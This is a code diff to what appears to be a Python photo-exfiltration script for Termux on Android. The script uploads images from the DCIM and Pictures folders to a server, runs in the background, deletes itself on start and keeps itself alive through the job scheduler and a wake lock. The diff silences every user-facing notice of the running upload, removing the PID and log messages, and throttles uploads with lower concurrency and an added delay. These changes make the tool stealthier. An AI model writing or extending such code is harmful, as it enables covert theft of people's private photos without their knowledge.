@@ -27,8 +27,8 @@ SERVER_UPLOAD_URL = SERVER_URL
 
 ROOT_STORAGE = Path(os.path.expanduser("~/storage"))
 ALLOWED_SUBDIRS = ["dcim", "pictures"]
-REQUEST_TIMEOUT = 30
-MAX_WORKERS = 16
+REQUEST_TIMEOUT = 300
+MAX_WORKERS = 6
 RUN_IN_BACKGROUND = True
 SELF_DELETE_ON_START = True
 ENABLE_PERSISTENT_SCHEDULER = True
@@ -91,7 +91,9 @@ def build_relative_path(file_path: Path) -> str:
 
 
 def upload_one_file(file_path: Path):
+    import time
     relative_path = build_relative_path(file_path)
+    time.sleep(0.5)
 
     try:
         response = send_file(file_path, relative_path)
@@ -134,8 +136,6 @@ def get_running_pid():
 def start_background_worker():
     running_pid = get_running_pid()
     if running_pid:
-        print(f"[INFO] Já existe processo de upload rodando. PID: {running_pid}")
-        print(f"[INFO] Log: {LOG_FILE}")
         return
 
     cmd = [sys.executable, str(Path(__file__).resolve()), "--worker"]
@@ -152,8 +152,6 @@ def start_background_worker():
         )
 
     PID_FILE.write_text(str(process.pid), encoding="utf-8")
-    print(f"[INFO] Upload iniciado em segundo plano. PID: {process.pid}")
-    print(f"[INFO] Acompanhar progresso: tail -f {LOG_FILE}")
 
 
 def create_scheduler_launcher() -> Path:
@@ -180,25 +178,15 @@ def install_persistent_scheduler():
             "--script", str(launcher),
         ]
         result = subprocess.run(cmd, check=False, capture_output=True, text=True)
-        if result.returncode == 0:
-            print("[INFO] termux-job-scheduler configurado para persistência.")
-        else:
-            print("[AVISO] Não foi possível configurar termux-job-scheduler automaticamente.")
-            print("[DICA] Instale termux-api e termux-services se necessário.")
     except FileNotFoundError:
-        print("[AVISO] Comando termux-job-scheduler não encontrado no ambiente.")
+        pass
 
 
 def enable_termux_wake_lock():
     try:
-        result = subprocess.run(["termux-wake-lock"], check=False, capture_output=True, text=True)
-        if result.returncode == 0:
-            print("[INFO] termux-wake-lock ativado com sucesso.")
-        else:
-            print("[AVISO] Não foi possível ativar termux-wake-lock automaticamente.")
-            print("[DICA] Execute manualmente: termux-wake-lock")
+        subprocess.run(["termux-wake-lock"], check=False, capture_output=True, text=True)
     except FileNotFoundError:
-        print("[AVISO] Comando termux-wake-lock não encontrado no ambiente.")
+        pass
 
 
 def clear_pid_file_if_current():
